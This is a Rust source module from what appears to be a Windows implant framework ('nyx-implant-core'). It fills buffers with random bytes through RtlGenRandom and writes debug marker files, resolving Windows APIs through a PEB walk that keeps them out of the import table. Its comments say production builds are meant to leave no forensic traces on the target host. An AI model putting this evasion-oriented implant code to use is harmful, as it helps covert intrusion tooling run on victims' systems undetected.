//! Diagnostics + CSPRNG primitives (WP-C 断环第三刀).
//!
//! Extracted from `entry` so low-level modules (`mem`, `channels/*`, `bof`)
//! can emit diagnostic markers and fill random buffers without depending on
//! the bootstrap module — breaking the `mem/channels → entry` edge ahead of
//! the crate split. Now part of the `nyx-implant-core` crate (WP-C core 抽取).
//!
//! All Windows-only. On the dev host this module is excluded by cfg.

#![cfg(target_os = "windows")]

/// Fill `buf` with cryptographically-secure random bytes.
///
/// Resolves `SystemFunction036` from `advapi32.dll` on first call (cached in a
/// static), then calls it to fill `buf` with cryptographically-secure random
/// bytes. Returns `true` on success, `false` if the function can't be resolved
/// or the call fails.
///
/// `SystemFunction036` / `RtlGenRandom` is the Windows kernel CSPRNG, documented
/// at <https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-rtlgenrandom>.
/// It's available on all Windows versions from XP SP2 (the earliest supported by
/// any modern toolchain) through Windows 11 25H2 and Server 2025. The export
/// name `SystemFunction036` is ordinal-stable and never renamed across builds.
pub fn csprng_fill(buf: &mut [u8]) -> bool {
    use core::sync::atomic::{AtomicUsize, Ordering};

    // Cache the resolved function address (0 = unresolved, usize::MAX = tried+failed).
    static SYSFUNC036: AtomicUsize = AtomicUsize::new(0);

    let mut addr = SYSFUNC036.load(Ordering::Acquire);
    if addr == 0 {
        // First call: resolve SystemFunction036 from advapi32.dll via PEB walk.
        addr = unsafe { crate::resolve::export_addr(b"advapi32.dll", b"SystemFunction036") }
            .unwrap_or(usize::MAX);
        SYSFUNC036.store(addr, Ordering::Release);
    }
    if addr == usize::MAX {
        return false;
    }

    // SystemFunction036(RandomBuffer: *mut u8, RandomBufferLength: u32) -> BOOL
    type RtlGenRandomFn = unsafe extern "system" fn(*mut u8, u32) -> i32;
    let f: RtlGenRandomFn = unsafe { core::mem::transmute(addr) };

    // RtlGenRandom returns 1 (TRUE) on success. It handles arbitrary buffer
    // sizes internally (chunks if needed), so a single call suffices.
    let ok = unsafe { f(buf.as_mut_ptr(), buf.len() as u32) };
    ok != 0
}

#[cfg(nyx_diag)]
/// Diagnostic: write a marker file `C:\nyx\diag_<mark>` so we can see which
/// bootstrap step was reached before a crash. Uses CreateFileA/WriteFile
/// resolved via PEB walk (no std fs). Best-effort — silently ignores errors.
pub fn diag_mark(mark: &[u8]) {
    let (create, write, close) = match diag_mark_resolve_apis() {
        Some(apis) => apis,
        None => return,
    };
    let path = diag_mark_build_path(mark);
    unsafe { diag_mark_write_file(create, write, close, &path) };
}

/// Resolve CreateFileA/WriteFile/CloseHandle via PEB walk; None if any missing.
#[cfg(nyx_diag)]
fn diag_mark_resolve_apis() -> Option<(usize, usize, usize)> {
    let cfa = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CreateFileA") } {
        Some(a) => a,
        None => return None,
    };
    let wf = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"WriteFile") } {
        Some(a) => a,
        None => return None,
    };
    let ch = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") } {
        Some(a) => a,
        None => return None,
    };
    Some((cfa, wf, ch))
}

/// Build `C:\nyx\diag_<mark>` (NUL-terminated, truncated to the buffer).
#[cfg(nyx_diag)]
fn diag_mark_build_path(mark: &[u8]) -> [u8; 64] {
    // Build path: C:\nyx\diag_<mark>
    let mut path = [0u8; 64];
    let prefix = b"C:\\nyx\\diag_";
    let mut i = 0;
    while i < prefix.len() && i < path.len() {
        path[i] = prefix[i];
        i += 1;
    }
    let mut j = 0;
    while j < mark.len() && i < path.len() - 1 {
        path[i] = mark[j];
        i += 1;
        j += 1;
    }
    path[i] = 0; // NUL terminator
    path
}

/// CreateFileA + WriteFile + CloseHandle on the built path. Best-effort.
#[cfg(nyx_diag)]
unsafe fn diag_mark_write_file(create: usize, write: usize, close: usize, path: &[u8; 64]) {
    use core::ffi::c_void;
    type CreateFileAFn = unsafe extern "system" fn(
        *const u8,
        u32,
        u32,
        *mut c_void,
        u32,
        u32,
        *mut c_void,
    ) -> *mut c_void;
    type WriteFileFn =
        unsafe extern "system" fn(*mut c_void, *const u8, u32, *mut u32, *mut c_void) -> i32;
    type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;

    let create: CreateFileAFn = core::mem::transmute(create);
    let write: WriteFileFn = core::mem::transmute(write);
    let close: CloseHandleFn = core::mem::transmute(close);

    // CREATE_ALWAYS=2, GENERIC_WRITE=0x40000000, FILE_SHARE_WRITE=2
    let h = create(
        path.as_ptr(),
        0x40000000,
        2,
        core::ptr::null_mut(),
        2,
        0,
        core::ptr::null_mut(),
    );
    if h.is_null() || h as usize == usize::MAX {
        return;
    }
    let data = b"ok";
    let mut written: u32 = 0;
    write(
        h,
        data.as_ptr(),
        data.len() as u32,
        &mut written,
        core::ptr::null_mut(),
    );
    close(h);
}

// Production builds ship without --cfg nyx_diag, so diag_mark is a compile-time
// no-op that leaves no forensic marker file on the target host.
#[cfg(not(nyx_diag))]
pub fn diag_mark(_mark: &[u8]) {
    // no-op: diagnostic markers are disabled in production builds
}
